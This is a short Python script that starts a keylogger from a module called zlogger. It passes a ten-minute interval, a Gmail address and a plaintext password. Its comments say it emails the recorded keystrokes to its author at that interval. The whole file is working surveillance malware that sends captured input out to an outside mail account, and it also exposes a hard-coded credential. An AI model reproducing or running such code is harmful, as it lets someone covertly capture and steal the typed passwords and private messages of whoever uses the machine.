
import zlogger

my_keylogger = zlogger.Keylogger(10,'smtplib.sav@gmail.com','XDSkPwtDU8erDJy')
# The 1st attribute I am passing to this object is time_interval, or every
# how many minutes the script should send an email to me
# The 2nd attribute is the email
# The 3rd attribute is the password
my_keylogger.start()

